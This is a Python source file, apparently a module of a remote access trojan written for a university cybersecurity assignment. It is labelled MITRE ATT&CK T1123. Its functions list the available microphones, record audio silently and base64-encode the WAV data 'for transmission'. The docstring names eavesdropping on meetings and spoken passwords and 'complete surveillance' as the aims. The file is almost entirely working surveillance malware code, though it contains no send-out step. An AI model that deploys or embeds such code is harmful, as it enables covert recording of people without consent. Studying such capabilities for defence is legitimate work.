"""
Microphone Capture Module
MITRE ATT&CK: T1123 (Audio Capture)
EDUCATIONAL PURPOSE ONLY - RMIT Cybersecurity Assignment

Records audio from the system microphone using sounddevice.
Commercial RATs with this capability: DarkComet, Imminent Monitor, njRAT.

Why this matters:
  - Audio capture = eavesdropping on conversations
  - Can capture meetings, phone calls, passwords spoken aloud
  - Works even when screen is off/locked
  - Combined with keylogger + webcam = complete surveillance

Dependencies: sounddevice, numpy, wave (stdlib)
"""

import base64
import io
import wave
import struct
from datetime import datetime

try:
    import sounddevice as sd
    HAS_SOUNDDEVICE = True
except ImportError:
    HAS_SOUNDDEVICE = False

try:
    import numpy as np
    HAS_NUMPY = True
except ImportError:
    HAS_NUMPY = False


def record_audio(duration_seconds=10, sample_rate=16000, channels=1):
    """
    Record audio from the default microphone.

    Args:
        duration_seconds: Recording length in seconds
        sample_rate: Audio sample rate (16000 = good quality, small size)
        channels: 1 = mono, 2 = stereo

    Returns:
        tuple: (dict with audio data, error string or None)

    MITRE ATT&CK: T1123 - Audio Capture
    """
    if not HAS_SOUNDDEVICE or not HAS_NUMPY:
        missing = []
        if not HAS_SOUNDDEVICE:
            missing.append("sounddevice")
        if not HAS_NUMPY:
            missing.append("numpy")
        return None, f"Missing dependencies: {', '.join(missing)}"

    try:
        # Record audio
        recording = sd.rec(
            int(duration_seconds * sample_rate),
            samplerate=sample_rate,
            channels=channels,
            dtype='int16',
            blocking=True
        )

        # Convert to WAV format in memory
        wav_buffer = io.BytesIO()
        with wave.open(wav_buffer, 'wb') as wf:
            wf.setnchannels(channels)
            wf.setsampwidth(2)  # 16-bit = 2 bytes
            wf.setframerate(sample_rate)
            wf.writeframes(recording.tobytes())

        wav_bytes = wav_buffer.getvalue()

        # Base64 encode for transmission
        audio_b64 = base64.b64encode(wav_bytes).decode("utf-8")

        # Calculate audio stats
        peak_amplitude = int(np.max(np.abs(recording)))
        avg_amplitude = int(np.mean(np.abs(recording)))

        return {
            "timestamp": datetime.now().isoformat(),
            "duration_seconds": duration_seconds,
            "sample_rate": sample_rate,
            "channels": channels,
            "size_bytes": len(wav_bytes),
            "format": "wav",
            "peak_amplitude": peak_amplitude,
            "avg_amplitude": avg_amplitude,
            "audio_b64": audio_b64,
        }, None

    except Exception as e:
        return None, str(e)


def list_audio_devices():
    """
    Enumerate available audio input devices.

    Returns:
        list of dicts with device info
    """
    if not HAS_SOUNDDEVICE:
        return []

    devices = []
    try:
        all_devices = sd.query_devices()
        for i, dev in enumerate(all_devices):
            if dev['max_input_channels'] > 0:
                devices.append({
                    "index": i,
                    "name": dev['name'],
                    "channels": dev['max_input_channels'],
                    "sample_rate": dev['default_samplerate'],
                    "is_default": (i == sd.default.device[0]),
                })
    except Exception:
        pass

    return devices


def get_default_mic_info():
    """
    Get info about the default microphone.

    Returns:
        dict with device info, or None
    """
    if not HAS_SOUNDDEVICE:
        return None

    try:
        dev = sd.query_devices(kind='input')
        return {
            "name": dev['name'],
            "channels": dev['max_input_channels'],
            "sample_rate": dev['default_samplerate'],
        }
    except Exception:
        return None


if __name__ == "__main__":
    print("=" * 50)
    print("  Microphone Capture Module Test")
    print("  MITRE ATT&CK: T1123 - Audio Capture")
    print("=" * 50)

    if not HAS_SOUNDDEVICE:
        print("\n[!] sounddevice not installed")
        print("    Install: pip install sounddevice numpy")
    else:
        devices = list_audio_devices()
        print(f"\n[*] Audio input devices: {len(devices)}")
        for d in devices:
            default = " (DEFAULT)" if d["is_default"] else ""
            print(f"    [{d['index']}] {d['name']} ({d['channels']}ch, {d['sample_rate']}Hz){default}")

        mic = get_default_mic_info()
        if mic:
            print(f"\n[*] Default mic: {mic['name']}")
            print(f"[*] Recording 5 seconds of audio...")
            data, err = record_audio(duration_seconds=5)
            if data:
                print(f"[+] Recorded: {data['duration_seconds']}s, {data['size_bytes']} bytes")
                print(f"    Peak amplitude: {data['peak_amplitude']}, Avg: {data['avg_amplitude']}")
            else:
                print(f"[-] Recording failed: {err}")
        else:
            print("[-] No microphone found")
